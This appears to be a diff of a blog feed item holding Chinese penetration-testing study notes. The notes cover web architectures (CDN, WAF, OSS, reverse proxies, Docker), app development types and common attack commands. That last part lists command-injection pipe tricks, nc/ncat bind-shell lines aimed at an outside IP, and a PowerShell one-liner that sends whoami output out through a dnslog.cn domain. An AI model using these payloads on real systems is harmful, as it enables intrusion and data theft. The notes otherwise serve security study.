-&lt;p&gt;08开始自带&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;批处理-bat&#34;&gt;批处理 (.bat)
+&lt;/h3&gt;&lt;p&gt;如果渗透的时候命令出现符号问题，可以尝试把命令放入批处理中，然后运行批处理来防止符号报错。&lt;/p&gt;
+&lt;h3 id=&#34;powershell&#34;&gt;powershell
+&lt;/h3&gt;&lt;p&gt;08开始自带&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;powershell -exec bypass .\aa.psl : 启用powershell并执行aa.psl文件
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;p&#34;&gt;p
+&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;分配站&lt;/strong&gt;：一个大域名为用户分配小域名&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;站库分离：&lt;/strong&gt; 网站和数据库的服务器不同&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;对象存储oss:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;相对路径、绝对路径：&lt;/p&gt;
+&lt;p&gt;主站、分站、端口站、子站&lt;/p&gt;
+&lt;p&gt;常规：url和文件目录对应上&lt;/p&gt;
+&lt;p&gt;路由访问：url和文件目录对应不上，需要根据配置路由决定&lt;/p&gt;
+&lt;p&gt;文件结构、语言类型&lt;/p&gt;
+&lt;p&gt;web程序源码：开源  商业  自写&lt;/p&gt;
+&lt;p&gt;开源-&lt;/p&gt;
+&lt;h4 id=&#34;前后端分离&#34;&gt;前后端分离
+&lt;/h4&gt;&lt;p&gt;原理：前端js框架，api传输数据&lt;/p&gt;
+&lt;p&gt;思路：找后端地址，找前端历史漏洞，社工&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1. 前端页面大部分不存在漏洞
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2. 后端管理大部分不在同域名
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;3. 获得权限可能不影响后端
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;宝塔phpstudy&#34;&gt;宝塔+phpstudy
+&lt;/h4&gt;&lt;p&gt;原理：打包类集成化环境，权限配置或受控制&lt;/p&gt;
+&lt;p&gt;影响：攻击者权限对比区别&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;拿到权限后
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;宝塔：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;文件管理 锁定目录
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;命令执行 无法执行
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;phpstudy
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;有权限
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;docker搭建&#34;&gt;docker搭建
+&lt;/h4&gt;&lt;p&gt;思路：docker逃逸&lt;/p&gt;
+&lt;p&gt;原理：虚拟化技术独立磁盘空间，非真实物理环境&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;攻击者只在虚拟空间磁盘
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;建站分配站&#34;&gt;建站分配站
+&lt;/h4&gt;&lt;p&gt;原理：利用别人的域名模板建立&lt;/p&gt;
+&lt;p&gt;影响：实质安全测试非目标资产&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;托管
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;申请（凡科建站）
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;静态web&#34;&gt;静态web
+&lt;/h4&gt;&lt;p&gt;例子：大学的html设计网站&lt;/p&gt;
+&lt;p&gt;原理：数据没有传输性（js传输不算）&lt;/p&gt;
+&lt;p&gt;影响：无漏洞&lt;/p&gt;
+&lt;h4 id=&#34;伪静态&#34;&gt;伪静态
+&lt;/h4&gt;&lt;p&gt;原理：动态转为静态技术，伪装的静态&lt;/p&gt;
+&lt;h3 id=&#34;架构&#34;&gt;架构
+&lt;/h3&gt;&lt;h4 id=&#34;waf&#34;&gt;waf
+&lt;/h4&gt;&lt;p&gt;原理：web应用防火墙&lt;/p&gt;
+&lt;p&gt;影响：常规web安全测试手段会受拦截&lt;/p&gt;
+&lt;p&gt;例子：windows2012 + IIS + d盾&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;非嵌入型：硬件型
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		软件型
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		云
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;嵌入型：网站内置的waf
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;cdn&#34;&gt;cdn
+&lt;/h4&gt;&lt;p&gt;原理： 内容分发服务，旨在提高访问速度&lt;/p&gt;
+&lt;p&gt;影响：隐藏真实IP，导致对目标测试错误&lt;/p&gt;
+&lt;p&gt;例子：阿里云备案域名全局CDN加速服务&lt;/p&gt;
+&lt;p&gt;​			windows2012 + BT宝塔面板 + CDN服务&lt;/p&gt;
+&lt;h4 id=&#34;oss&#34;&gt;oss
+&lt;/h4&gt;&lt;p&gt;原理：云存储服务，提高访问速度&lt;/p&gt;
+&lt;p&gt;影响：无法解析，单独存储，但有accesskey隐患&lt;/p&gt;
+&lt;p&gt;例子：http://cloudreve.org/&lt;/p&gt;
+&lt;p&gt;​		   windows2012 + cloudreve + 阿里云oss&lt;/p&gt;
+&lt;h4 id=&#34;反向代理&#34;&gt;反向代理
+&lt;/h4&gt;&lt;p&gt;反向代理 为服务器服务&lt;/p&gt;
+&lt;p&gt;正向代理 为客户端服务&lt;/p&gt;
+&lt;p&gt;原理：通过网络反向代理转发真实服务达到访问目的&lt;/p&gt;
+&lt;p&gt;影响：访问目标只是一个代理，非真实应用服务器&lt;/p&gt;
+&lt;p&gt;注意：正向和反向代理都是解决访问不可达问题，但反向代理中多出一个可以重定向解析的功能操作，导致反向代理出的站点指向和真实应用毫无关系&lt;/p&gt;
+&lt;p&gt;例子：nginx反向代理设置&lt;/p&gt;
+&lt;h4 id=&#34;负载均衡&#34;&gt;负载均衡
+&lt;/h4&gt;&lt;p&gt;原理：分摊到多个操作单元上进行执行，共同完成工作任务&lt;/p&gt;
+&lt;p&gt;影响：有多个服务加载服务，测试过程中存在多个目标情况&lt;/p&gt;
+&lt;p&gt;例子：nginx负载均衡配置&lt;/p&gt;
+&lt;h2 id=&#34;app应用开发架构&#34;&gt;APP应用开发架构
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;原生开发&lt;/li&gt;
+&lt;li&gt;h5语言开发‘&lt;/li&gt;
+&lt;li&gt;flutter开发&lt;/li&gt;
+&lt;li&gt;常规web开发 （网页封装app）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;原生态-idea
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;例子：remusic项目源码
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;安全影响：反编译+抓包+常规测试
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;web封装-封装平台
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;例子：shopXO源码程序+一门app打包
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;安全影响：常规web安全测试
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;H5+vue-Hbuilderx
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;例子：hbuilderx案例
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;安全影响：api&amp;amp;js框架问题 （前后端分离）
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wx小程序-web开发-hbuilderx
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;例子：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;判断原生态还是web
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1. 文件管理器
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2. 看app的功能，ui
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;常见渗透命令&#34;&gt;常见渗透命令
+&lt;/h2&gt;&lt;h3 id=&#34;文件下载命令-解决无图形化数据传输&#34;&gt;文件下载命令-解决无图形化&amp;amp;数据传输
+&lt;/h3&gt;&lt;p&gt;**生成命令：**&lt;a class=&#34;link&#34; href=&#34;https://forum.ywhack.com/bountytips.php?download&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://forum.ywhack.com/bountytips.php?download&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;**linux：**wget curl python tuby perl java等&lt;/p&gt;
+&lt;p&gt;**windows：**powershell等&lt;/p&gt;
+&lt;h3 id=&#34;反弹shell命令&#34;&gt;反弹shell命令
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;命令生成：https://forum.ywhack.com/&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;​					blackhat插件&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;正向连接：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;127.0.0.1 | c:\\nc.exe -e -lvnp 5566
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ncat 47.122.23.131 5566
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;反向连接：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;127.0.0.1 | 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;例子：防火墙绕过-正向连接&amp;amp;反向连接&amp;amp;内网服务器&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;管道符&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;|		||		&amp;amp;&amp;amp;		&amp;amp;&lt;/p&gt;
+&lt;p&gt;windows：|		&amp;amp;		||		&amp;amp;&amp;amp;&lt;/p&gt;
+&lt;p&gt;linux：；		| 		||		 ``&lt;/p&gt;
+&lt;p&gt;例子:	ping &lt;code&gt;whoami&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;**防火墙 **&lt;/p&gt;
+&lt;p&gt;出站规则&lt;/p&gt;
+&lt;p&gt;入站规则&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞存在，但不回显&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;反弹shell&lt;/li&gt;
+&lt;li&gt;带外查询&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;linux： ping &lt;code&gt;whoami&lt;/code&gt;.[dnslog网址]&lt;/p&gt;
+&lt;p&gt;windows:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cmd无法执行whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;用powershell变量赋值，把whoami执行结果给变量
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;结果带有&amp;#34;\&amp;#34;,导致ping无法执行
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;powershell $x=whoami;$x=$x.Replace(&amp;#39;\&amp;#39;,&amp;#39;xxx&amp;#39;);$y=&amp;#39;.vpod5d.dnslog.cn&amp;#39;;$z=$x+$y;ping $z 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
         </item>
         
